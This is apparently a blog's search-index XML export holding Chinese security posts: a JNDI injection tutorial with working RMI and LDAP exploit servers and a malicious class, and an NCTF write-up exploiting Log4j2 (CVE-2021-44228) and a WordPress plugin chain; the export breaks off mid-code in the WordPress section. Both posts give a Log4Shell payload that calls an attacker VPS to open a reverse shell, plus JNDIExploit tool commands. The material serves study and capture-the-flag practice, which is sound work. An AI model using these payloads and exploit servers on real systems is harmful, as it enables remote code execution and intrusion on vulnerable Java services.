<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>JNDI注入</title>
      <link href="/JNDI%E6%B3%A8%E5%85%A5/"/>
      <url>/JNDI%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>这里记录下对于JNDI的了解以及JNDI注入的原理</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>JNDI是Java中提供的Java命名和目录接口，可以通过JNDI的API定位资源以及程序对象，通俗来讲就是如果程序中定义了JNDI的接口，那么就类似于一个索引中心，允许客户端通过名字发现和查找数据和对象，JNDI可以访问的目录以及服务有JDBC，LDAP，RMI，DNS，NIS，CORBA。那上面提到的命名以及目录服务又是什么。</p><h3 id="命名服务"><a href="#命名服务" class="headerlink" title="命名服务"></a>命名服务</h3><p>命名服务将名称也就是名字与对象进行关联，即提供通过名字找到对象的操作，就好比DNS系统将计算机与ip地址关联。在一些命名服务系统中，不是将对象直接储存在系统中，而是储存对象的引用(这里的引用包含了如何访问实际对象的信息)。</p><p>有一种命令服务系统叫做LDAP(轻量级目录访问协议)，它的名称是从右到左进行逐级定义，各级之间用逗号进行分隔，数据结构类似于键值，例如下面例子：cn&#x3D;John, o&#x3D;Sun, c&#x3D;US，这个例子意思就是在c&#x3D;US的子域中查找o&#x3D;Sun的子域，再在结果中查找cn&#x3D;John的对象。</p><p>在名称系统中有几个比较重要的概念</p><h4 id="Bindings："><a href="#Bindings：" class="headerlink" title="Bindings："></a>Bindings：</h4><p>表示一个名称和对应对象的绑定关系，比如文件系统中文件名绑定到对应的文件，dns中域名绑定到对应的ip</p><h4 id="Context"><a href="#Context" class="headerlink" title="Context:"></a>Context:</h4><p>上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以从一个上下文中查找名称对应的对象，比如在文件系统中一个目录就是一个上下文，其中子目录称为子上下文(subcontext)</p><h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p>对象的引用。在一些命名服务系统中可能无法直接储存对象，而是以引用的形式储存，可以理解为c++的指针，这个引用包含了获取实际对象的信息。</p><h3 id="目录服务"><a href="#目录服务" class="headerlink" title="目录服务"></a>目录服务</h3><p>目录服务是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性，目录服务中的对象称为目录对象。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。所以通过目录服务我们不仅可以通过名字来找对象，还可以通过属性值去找对象。</p><p>接下来将会介绍俩种目录服务(RMI和LDAP)与JNDI之间产生的注入</p><h3 id="JNDI的结构"><a href="#JNDI的结构" class="headerlink" title="JNDI的结构"></a>JNDI的结构</h3><p>除了RMI(远程方法调用)是Java特有的远程调用框架，其他的(即LDAP，CORBA)都是通用的服务和标准，可以脱离Java独立使用，JNDI提供了统一的接口，方便调用各种服务。Java JDK中有五个包提供了JNDI的功能实现，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">javax.naming：主要用于命名操作,包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。</span><br><span class="line">javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；</span><br><span class="line">javax.naming.event：在命名目录服务器中请求事件通知；</span><br><span class="line">javax.naming.ldap：提供LDAP支持；</span><br><span class="line">javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</span><br></pre></td></tr></table></figure><h3 id="相关类介绍"><a href="#相关类介绍" class="headerlink" title="相关类介绍"></a>相关类介绍</h3><h4 id="InitialContext类"><a href="#InitialContext类" class="headerlink" title="InitialContext类"></a>InitialContext类</h4><p>这个类作用是获取初始上下文，通俗来讲就是获取初始目录环境，这个类里面提供了lookup()方法用于通过名称查找对象，提供bind()和rebind()方法用于绑定和重绑定以及unbind()方法用于解绑定</p><p>构造方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//构建一个初始上下文。</span><br><span class="line">InitialContext() </span><br><span class="line">//构造一个初始上下文，并选择不初始化它。</span><br><span class="line">InitialContext(boolean lazy) </span><br><span class="line">//使用提供的环境构建初始上下文。</span><br><span class="line">InitialContext(Hashtable&lt;?,?&gt; environment) </span><br></pre></td></tr></table></figure><p>常用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//将名称绑定到对象。 </span><br><span class="line">bind(Name name, Object obj) </span><br><span class="line">//枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。</span><br><span class="line">list(String name) </span><br><span class="line">//检索命名对象。</span><br><span class="line">lookup(String name)  </span><br><span class="line">//将名称绑定到对象，覆盖任何现有绑定。</span><br><span class="line">rebind(String name, Object obj) </span><br><span class="line">//取消绑定命名对象。</span><br><span class="line">unbind(String name)  </span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import javax.naming.InitialContext;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line">public class jndi &#123;</span><br><span class="line">    public static void main(String[] args) throws NamingException &#123;</span><br><span class="line">        String uri = &quot;rmi://127.0.0.1:1099/work&quot;;  </span><br><span class="line">        </span><br><span class="line">        //在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。</span><br><span class="line">        InitialContext initialContext = new InitialContext();</span><br><span class="line">        initialContext.lookup(uri); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h4><p>表示对在命名&#x2F;目录系统外部找到的对象的引用</p><p>构造方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//为类名为“className”的对象构造一个新的引用。</span><br><span class="line">Reference(String className) </span><br><span class="line">//为类名为“className”的对象和地址构造一个新引用。 </span><br><span class="line">Reference(String className, RefAddr addr) </span><br><span class="line">//为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。 </span><br><span class="line">Reference(String className, RefAddr addr, String factory, String factoryLocation) </span><br><span class="line">//为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  </span><br><span class="line">Reference(String className, String factory, String factoryLocation)</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">参数：</span><br><span class="line">className 远程加载时所使用的类名</span><br><span class="line">factory  加载的class中需要实例化类的名称</span><br><span class="line">factoryLocation  提供classes数据的地址可以是file/ftp/http协议</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>常用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//将地址添加到索引posn的地址列表中。</span><br><span class="line">void add(int posn, RefAddr addr) </span><br><span class="line">//将地址添加到地址列表的末尾。 </span><br><span class="line">void add(RefAddr addr) </span><br><span class="line">//从此引用中删除所有地址。  </span><br><span class="line">void clear() </span><br><span class="line">//检索索引posn上的地址。 </span><br><span class="line">RefAddr get(int posn) </span><br><span class="line">//检索地址类型为“addrType”的第一个地址。  </span><br><span class="line">RefAddr get(String addrType) </span><br><span class="line">//检索本参考文献中地址的列举。 </span><br><span class="line">Enumeration&lt;RefAddr&gt; getAll() </span><br><span class="line">//检索引用引用的对象的类名。 </span><br><span class="line">String getClassName() </span><br><span class="line">//检索此引用引用的对象的工厂位置。  </span><br><span class="line">String getFactoryClassLocation() </span><br><span class="line">//检索此引用引用对象的工厂的类名。  </span><br><span class="line">String getFactoryClassName() </span><br><span class="line">//从地址列表中删除索引posn上的地址。    </span><br><span class="line">Object remove(int posn) </span><br><span class="line">//检索此引用中的地址数。 </span><br><span class="line">int size() </span><br><span class="line">//生成此引用的字符串表示形式。</span><br><span class="line">String toString() </span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line">import javax.naming.Reference;</span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class jndi &#123;</span><br><span class="line">    public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        String url = &quot;http://127.0.0.1:8080&quot;; </span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        Reference reference = new Reference(&quot;test&quot;, &quot;test&quot;, url);</span><br><span class="line">        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(&quot;aa&quot;,referenceWrapper);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的Rigistry类是RMI用于注册和查找远程对象的一个类，通过LocateRegistry.createRegistry方法创建一个注册表并将其绑定到参数对应的端口中，然后再reference一个对象引用这里将这个对象引用传进ReferenceWrapper的原因是将类注册到Registry时需要实现Remote和继承UnicastRemoteObject类，但这里没有相关代码，所以这里需要使用ReferenceWrapper进行一个封装，然后再将ReferenceWrapper对象绑定到前面所创建的注册表中，绑定名称为”aa“，那么客户端就可以通过这个绑定名称查找到相应的对象。</p><h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><p>其原理就是控制lookup函数的参数，使得客户端访问恶意的RMI或者LDAP服务来加载恶意的对象，从而执行代码完成注入</p><h2 id="JNDI使用RMI协议进行注入"><a href="#JNDI使用RMI协议进行注入" class="headerlink" title="JNDI使用RMI协议进行注入"></a>JNDI使用RMI协议进行注入</h2><p>这里进行复现的条件是低版本JDK，我使用的是JDK 7u79，在idea上复现。先新起一个项目，可以命名为JNDI，在&#x2F;src&#x2F;main&#x2F;java下创建一个包命名为jndi_rmi_injection，然后在这个包里创建俩个类RmiClient和RmiServer，分别表示客户端和服务端</p><p>服务端代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import javax.naming.Reference;</span><br><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line">public class RmiServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(7778);</span><br><span class="line">        Reference reference = new Reference(&quot;Calculator&quot;, &quot;Calculator&quot;, &quot;http://127.0.0.1:8081/&quot;);</span><br><span class="line">        ReferenceWrapper wrapper = new ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(&quot;RCE&quot;, wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">package jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line">public class RmiClient &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        String uri = &quot;rmi://127.0.0.1:7778/RCE&quot;;</span><br><span class="line">        InitialContext initialContext = new InitialContext();</span><br><span class="line">        initialContext.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面服务端中创建Reference对象中的Calculator就是我们要加载注入的恶意对象，下面是恶意类代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public class Calculator &#123;</span><br><span class="line">    public Calculator() throws Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将这个恶意类可以放在小皮的根目录里，然后将其编译生成一个.class文件。<img src="/pic/1.png" alt="img"></p><p>然后在对应目录下打开cmd，执行命令将其放到http目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8081</span><br></pre></td></tr></table></figure><p>这个命令意思就是在当前目录下启动一个http服务器，将该目录作为根目录，监听端口8081，就可以通过浏览器或其他http客户端访问服务器上的文件。<img src="/pic/2.png" alt="img"></p><p>然后分别运行服务端和客户端代码即可完成弹窗<img src="/pic/3.png" alt="img"></p><h2 id="JNDI使用LDAP协议进行注入"><a href="#JNDI使用LDAP协议进行注入" class="headerlink" title="JNDI使用LDAP协议进行注入"></a>JNDI使用LDAP协议进行注入</h2><p>环境跟上面一样，但需要导入一个依赖，需要下载unboundid-ldapsdk-3.2.0.jar，然后在项目的模块设置中加入这个依赖即可</p><p>服务端代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">package jndi_ldap_injectioin;</span><br><span class="line"></span><br><span class="line">import java.net.InetAddress;</span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import javax.net.ServerSocketFactory;</span><br><span class="line">import javax.net.SocketFactory;</span><br><span class="line">import javax.net.ssl.SSLSocketFactory;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line">import com.unboundid.ldap.sdk.Entry;</span><br><span class="line">import com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line">import com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line">import com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line">public class LDAPServer &#123;</span><br><span class="line">    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;</span><br><span class="line">//定义LDAP服务的基础目录</span><br><span class="line"></span><br><span class="line">    public static void main (String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        String url = &quot;http://127.0.0.1:8081/#Calculator&quot;;</span><br><span class="line">        int port = 1234;</span><br><span class="line">//配置监听的url以及端口</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">        //创建InMemoryDirectoryServerConfig对象</span><br><span class="line">            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">        //配置LDAP服务监听器</span><br><span class="line">            config.setListenerConfigs(new InMemoryListenerConfig(</span><br><span class="line">                    &quot;listen&quot;,</span><br><span class="line">                    InetAddress.getByName(&quot;0.0.0.0&quot;),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line">   //添加LDAP操作拦截器</span><br><span class="line">            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));</span><br><span class="line">        //创建InMemoryDirectoryServer对象并启动</span><br><span class="line">            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        catch ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;</span><br><span class="line">        private URL codebase;</span><br><span class="line">        </span><br><span class="line">        public OperationInterceptor ( URL cb ) &#123;</span><br><span class="line">            this.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;</span><br><span class="line">        //处理LDAP搜索结果</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = new Entry(base);</span><br><span class="line">            try &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            catch ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123;</span><br><span class="line">        //构造LDAP搜索结果并发送</span><br><span class="line">            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;));</span><br><span class="line">            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);</span><br><span class="line">            e.addAttribute(&quot;javaClassName&quot;, &quot;Exploit&quot;);</span><br><span class="line">            String cbstring = this.codebase.toString();</span><br><span class="line">            int refPos = cbstring.indexOf(&#x27;#&#x27;);</span><br><span class="line">            if ( refPos &gt; 0 ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(0, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span><br><span class="line">            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);</span><br><span class="line">            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">package jndi_ldap_injectioin;</span><br><span class="line"></span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line">public class LDAPClient &#123;</span><br><span class="line">    public static void main(String[] args) throws NamingException&#123;</span><br><span class="line">        String url = &quot;ldap://127.0.0.1:1234/Calculator&quot;;</span><br><span class="line">        InitialContext initialContext = new InitialContext();</span><br><span class="line">        initialContext.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恶意类代码跟上面的一样</p><p>还是一样将恶意代码放到http目录上，然后运行代码实现弹窗<img src="/pic/4.png" alt="img"></p><h1 id="JNDI注入工具使用"><a href="#JNDI注入工具使用" class="headerlink" title="JNDI注入工具使用"></a>JNDI注入工具使用</h1><p>这里我使用的是<a href="https://github.com/WhiteHSBG/JNDIExploit?tab=readme-ov-file">WhiteHSBG&#x2F;JNDIExploit: 对原版https://github.com/feihong-cs/JNDIExploit 进行了实用化修改</a></p><p>在cmd中敲入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.4-SNAPSHOT.jar [options]</span><br><span class="line"></span><br><span class="line">optioins:</span><br><span class="line"> -i或者--ip      表示攻击机的ip地址，这里我用的我vps的ip</span><br><span class="line"> -l或者--ldapPort  表示ldap的端口，不设置的话默认为1389</span><br><span class="line"> -p或者--httpPort  表示http设置的端口，默认值是3456</span><br><span class="line"> -u或者--usage  会显示可以用的命令</span><br></pre></td></tr></table></figure><p>具体使用方法就是在攻击机上运行上面命令，然后在注入点处插入命令，比如说反弹shell。我在vps上使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.4-SNAPSHOT.jar -i vps_ip -l 开放的端口</span><br></pre></td></tr></table></figure><p>然后另起窗口使用-u指令可以查看可以用的payload<img src="/pic/5.png" alt="img"></p><p>可以使用里面的Basic的ReverseShell反弹指令，payload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://vps_ip:ldap的端口/Basic/ReverseShell/vps_ip/反弹监听的端口&#125;</span><br></pre></td></tr></table></figure><p>先在vps上监听上面的端口，在用bp发送插入payload的包即可</p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JNDI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF复现</title>
      <link href="/NCTF%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"/>
      <url>/NCTF%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>此次比赛0解，需要学习的地方很多，很多都是没有涉及到的地方，对于Java安全的部分学习要加快了</p><h1 id="logging"><a href="#logging" class="headerlink" title="logging"></a>logging</h1><p>这题算是一道签到题，这里涉及到了Log4j2漏洞利用和JNDI注入，都是没有学过的，从头来。JNDI注入部分在这，这道题是关于Log4j2的CVE-2021-44228漏洞的一些利用，如这个<a href="https://www.cnblogs.com/loongten/p/15822195.html%E4%B8%8B%E9%9D%A2%E6%98%AF%E9%A2%98%E8%A7%A3%E8%BF%87%E7%A8%8B%E3%80%82">https://www.cnblogs.com/loongten/p/15822195.html下面是题解过程。</a></p><p>跟据出题人的提示，先在本地搭建环境，使用java编译运行.文件jar</p><p><img src="/pic/6.png" alt="img"></p><p>可以看到运行成功，然后在浏览器进去本地的80端口，可以看到搭起来了</p><p><img src="/pic/7.png" alt="img"></p><p>跟据hint可知，构造一个畸形的数据包可以使控制台报错，并且构造点可以在accept和host。这里我在accept头处进行一个伪造，通过bp抓到发送到repeater。修改accept为123，然后发送可以看到控制台处报错</p><p><img src="/pic/8.png" alt="img"></p><p><img src="/pic/9.png" alt="img"></p><p>而log4j2是一个日志系统，用于处理日志信息，为了输出日志时能输出任意位置的java对象，引入了lookup接口，那么就有可能存在JNDI注入的利用。</p><p>当处理日志时发现日志中有${}时，就会将里面的内容替换成真实内容，即通过lookup查找到的内容，那么我们就可以将里面替换成RMI或者LDAP协议内容完成注入。先使用rmi协议进行dnslog解析查看是否能被利用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在accept头中写入下面注入语句</span><br><span class="line">$&#123;jndi:ldap://dnslog的地址&#125;</span><br></pre></td></tr></table></figure><p>如下</p><p><img src="/pic/10.png" alt="img"></p><p><img src="/pic/11.png" alt="img"></p><p>可以看到dns完成了解析说明可以利用，那么剩下的就跟JNDI注入了，这里使用上面JNDI注入里的工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.4-SNAPSHOT.jar -i vps_ip -l 开放的端口</span><br></pre></td></tr></table></figure><p>然后在bp里写入语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://vps_ip:ldap的端口/Basic/ReverseShell/vps_ip/反弹监听的端口&#125;</span><br></pre></td></tr></table></figure><p>在vps里再另起窗口监听，然后bp发送，可以发现反弹成功，但我这里的环境有问题，连上了但是有问题无法执行命令</p><h1 id="ez-wordpress"><a href="#ez-wordpress" class="headerlink" title="ez_wordpress"></a>ez_wordpress</h1><p>跟据提示先在kali上使用wpscan扫，做信息收集</p><ul><li>Wordpress的版本是6.4.1，网上有相应的pop链</li><li>有插件all-in-one-video-gallery版本是2.6.4，有任意文件读取和SSRF漏洞</li><li>contact-form-7，这里提供了文件上传功能，版本是5.8.4</li><li>drag-and-drop-multiple-file-upload-contact-form-7，版本是1.3.6.2；也是文件上传的点。</li></ul><p>这题的做题思路是phar反序列化和SSRF</p><p>利用drag-and-drop-multiple-file-upload-contact-form-7上传phar文件，然后使用phar伪协议读取其二进制内容，然后连接</p><p>这里的phar文件构造如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 